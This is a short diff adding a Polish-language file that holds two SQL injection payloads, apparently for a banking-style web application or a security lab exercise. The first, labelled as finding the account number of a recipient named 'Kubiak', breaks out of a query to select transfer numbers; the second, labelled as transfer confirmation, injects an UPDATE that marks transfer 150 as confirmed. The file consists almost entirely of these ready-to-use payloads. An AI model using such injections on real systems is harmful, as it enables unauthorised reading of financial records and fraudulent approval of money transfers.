@@ -1,0 +1,10 @@
+Numer konta, gdzie odbiorca ma nazwę "Kubiak"
+
+',0);; SELECT trNr as id from transfer where trName='Kubiak' -- '
+
+
+Zatwierdzenie przelewu
+
+',0) as id;; update transfer set confirmed=true where id=150 -- '
+
+
